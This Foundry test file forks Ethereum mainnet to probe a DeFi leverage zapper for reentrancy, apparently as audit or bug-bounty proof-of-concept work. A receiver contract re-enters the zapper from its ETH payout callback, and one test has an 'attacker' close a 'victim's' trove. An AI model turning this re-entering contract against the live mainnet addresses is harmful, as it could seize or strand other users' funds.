// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ILeverageZapper} from "../src/Zappers/Interfaces/ILeverageZapper.sol";

interface IWZ2 {
    function closeTroveToRawETH(uint256) external;
    function closeTroveFromCollateral(uint256, uint256, uint256) external;
}

interface IReg {
    function boldToken() external view returns (address);
    function collateralRegistry() external view returns (address);
    function troveNFT() external view returns (address);
}

interface ICReg {
    function boldToken() external view returns (address);
    function getToken(address) external view returns (address);
}

/// @dev receiver that re-enters the zapper once, from the ETH payout callback.
contract Reenter {
    address public zap;
    uint256 public ownTrove;
    bool public armed;
    uint256 public calls;

    constructor(address _zap) { zap = _zap; }

    function arm(uint256 _trove) external { ownTrove = _trove; armed = true; }

    function approveToken(address t, address s) external { IERC20(t).approve(s, type(uint256).max); }

    receive() external payable {
        calls++;
        if (armed) {
            armed = false;
            IWZ2(zap).closeTroveToRawETH(ownTrove);
        }
    }
}

contract ReenterTest is Test {
    address constant ZAPPER = 0xdCcBD7A365aeE086aa3b4EDe8afe895B20770AE3;
    address constant REGISTRY = 0x20F7C9ad66983F6523a0881d0f82406541417526;
    address constant COLLREG = 0xf949982B91C8c61e952B3bA942cbbfaef5386684;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address userA;
    address bot;
    address botB;
    Reenter reenter;
    IERC20 bold;
    address BO;

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), 26_346_800);
        userA = makeAddr("userA");
        bot = makeAddr("bot");
        botB = makeAddr("botB");
        reenter = new Reenter(ZAPPER);
        bold = IERC20(ICReg(COLLREG).boldToken());
        BO = 0x372ABD1810eAF23Cb9D941BbE7596DFb2c46BC65;
    }

    function _open(address owner, address removeManager, address receiver) internal returns (uint256 id) {
        ILeverageZapper.OpenLeveragedTroveParams memory p;
        p.owner = owner;
        p.ownerIndex = 0;
        p.collAmount = 1 ether;
        p.flashLoanAmount = 0.5 ether;
        p.boldAmount = 2000e18;
        p.annualInterestRate = 5e16;
        p.maxUpfrontFee = type(uint256).max;
        p.removeManager = removeManager;
        p.receiver = receiver;
        ILeverageZapper(ZAPPER).openLeveragedTroveWithRawETH{value: 1 ether + 0.0375 ether}(p);

        uint256 ownerIndex = uint256(keccak256(abi.encode(address(this), uint256(0))));
        id = uint256(keccak256(abi.encode(ZAPPER, owner, ownerIndex)));
    }

    function testDebugIds() public {
        uint256 id = _open(userA, bot, address(reenter));
        address tm = IReg(REGISTRY).troveNFT();
        (bool ok, bytes memory r) = tm.staticcall(abi.encodeWithSignature("ownerOf(uint256)", id));
        emit log_named_uint("id", id);
        emit log_named_uint("ownerOf ok", ok ? 1 : 0);
        if (ok) emit log_named_address("owner", abi.decode(r, (address)));
        uint256 alt = uint256(keccak256(abi.encode(ZAPPER, userA, uint256(keccak256(abi.encode(this, uint256(0)))))));
        (bool ok2, bytes memory r2) = tm.staticcall(abi.encodeWithSignature("ownerOf(uint256)", alt));
        emit log_named_uint("alt ok", ok2 ? 1 : 0);
        if (ok2) emit log_named_address("alt owner", abi.decode(r2, (address)));
    }

    /// both receivers = the re-entering contract: nesting must not corrupt accounting
    function testNestedSameReceiver() public {
        uint256 a = _open(userA, bot, address(reenter));
        reenter.approveToken(address(bold), ZAPPER);
        deal(address(bold), address(reenter), 5000e18);
        uint256 b = _open(address(reenter), botB, address(reenter));
        reenter.arm(b);

        deal(address(bold), bot, 5000e18);
        vm.prank(bot);
        bold.approve(ZAPPER, type(uint256).max);

        uint256 beforeReenter = address(reenter).balance;
        vm.prank(bot);
        IWZ2(ZAPPER).closeTroveToRawETH(a);

        emit log_named_uint("reenter eth gained", address(reenter).balance - beforeReenter);
        emit log_named_uint("zapper eth left", address(ZAPPER).balance);
        emit log_named_uint("reenter callbacks", reenter.calls());
        assertLe(address(ZAPPER).balance, 0.0001 ether);
        assertGt(address(reenter).balance - beforeReenter, 3 ether);
    }

    /// inner trove is owner-closed inside the callback: pays its owner, nothing remains in the zapper
    function testNestedInnerReceiverZapper() public {
        uint256 a = _open(userA, bot, address(reenter));
        reenter.approveToken(address(bold), ZAPPER);
        deal(address(bold), address(reenter), 5000e18);
        uint256 b = _open(address(reenter), botB, ZAPPER);
        reenter.arm(b);

        deal(address(bold), bot, 5000e18);
        vm.prank(bot);
        bold.approve(ZAPPER, type(uint256).max);

        uint256 beforeReenter = address(reenter).balance;
        vm.prank(bot);
        IWZ2(ZAPPER).closeTroveToRawETH(a);

        uint256 gained = address(reenter).balance - beforeReenter;
        emit log_named_uint("reenter eth gained", gained);
        emit log_named_uint("zapper eth left", address(ZAPPER).balance);
        // inner trove's own receiver is the ZAPPER yet its proceeds left the zapper:
        assertLe(address(ZAPPER).balance, 0.0001 ether);
        assertGt(gained, 3 ether, "inner proceeds were swept to the OUTER receiver");
    }

    /// third party nests a foreign trove (receiver = ZAPPER) and harvests its proceeds
    function testThirdPartyHarvestsForeignStuckTrove() public {
        uint256 victim = _open(userA, address(reenter), ZAPPER);
        uint256 mine = _open(address(reenter), botB, address(reenter));
        reenter.approveToken(address(bold), ZAPPER);
        deal(address(bold), address(reenter), 5000e18);
        reenter.arm(victim);

        uint256 beforeReenter = address(reenter).balance;
        vm.prank(address(reenter));
        IWZ2(ZAPPER).closeTroveToRawETH(mine);

        uint256 gained = address(reenter).balance - beforeReenter;
        emit log_named_uint("attacker eth gained", gained);
        emit log_named_uint("zapper eth left", address(ZAPPER).balance);
        // closeTroveToRawETH has no leftover step: the victim's proceeds stay in the zapper
        assertGt(gained, 1.5 ether, "own proceeds paid");
        assertGt(address(ZAPPER).balance, 1.5 ether, "victim proceeds left in the zapper");
    }

    /// outer flow HAS a leftover sweep, but it only tracks ERC20 (WETH/BOLD): the nested
    /// trove's ETH stays in the zapper and is NOT recovered by the outer call
    function testLeftoverSweepCrossesCalls() public {
        uint256 outer = _open(userA, bot, address(reenter));
        uint256 victim = _open(address(0xC0FFEE), address(reenter), ZAPPER);
        reenter.approveToken(address(bold), ZAPPER);
        deal(address(bold), address(reenter), 5000e18);
        deal(address(bold), bot, 5000e18);
        vm.prank(bot);
        bold.approve(ZAPPER, type(uint256).max);
        reenter.arm(victim);

        uint256 beforeReenter = address(reenter).balance;
        vm.prank(bot);
        IWZ2(ZAPPER).closeTroveFromCollateral(outer, 1.2 ether, 0.2 ether);

        uint256 gained = address(reenter).balance - beforeReenter;
        emit log_named_uint("outer receiver gained", gained);
        emit log_named_uint("zapper eth left", address(ZAPPER).balance);
        // outer receiver only gets its own collLeft + gas compensation
        assertApproxEqAbs(gained, 0.3375 ether, 0.001 ether);
        // the nested trove's ETH remains, even though the outer call sweeps leftovers
        assertGt(address(ZAPPER).balance, 1.5 ether, "nested ETH not recovered");
    }
}
